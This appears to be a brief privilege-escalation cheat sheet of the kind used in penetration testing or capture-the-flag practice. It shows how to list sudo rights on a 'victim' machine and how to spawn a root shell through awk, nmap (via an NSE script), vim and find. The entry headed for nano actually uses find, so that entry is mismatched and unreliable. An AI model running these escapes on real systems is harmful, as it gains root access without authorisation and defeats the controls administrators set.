`sudo -l` command lists the commands that the user is allowed to run with `sudo` privileges.

#### Programs that can run via Sudo
**Victim's Machine**
```
sudo -l
```

#### Exploitation
##### For `/usr/bin/nano` 
```
sudo find /bin -name nano -exec /bin/sh \;
```
##### For `/usr/bin/awk`
```
sudo awk 'BEGIN {system("/bin/sh")}'
```
##### For `/usr/bin/nmap`
```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```
##### For `/usr/bin/vim`
```
sudo vim -c '!sh'
```
